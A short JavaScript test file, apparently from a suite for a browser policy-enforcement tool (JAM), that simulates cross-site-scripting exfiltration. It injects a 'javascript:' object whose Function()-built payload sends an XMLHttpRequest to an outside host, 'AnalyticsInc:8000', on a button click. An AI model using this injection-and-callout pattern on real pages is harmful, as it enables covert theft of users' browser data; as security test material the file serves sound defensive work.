// exfil_test_xss.js
function exfiltrate_key_history() {
  var URL = 'Function(\'xmlhttp=new XMLHttpRequest();xmlhttp.open("GET","http://AnalyticsInc:8000/submission.html?test=xss1",true);xmlhttp.send(null);\')()';
  var script = document.createElement("object");
  script.data = "javascript:" + URL;
  var v0 = document.getElementsByTagName("body")[0];
  JAM.call(v0.appendChild, v0, [script]);
  return;
}
JAM.set(document.getElementById("test"), "onclick", exfiltrate_key_history)
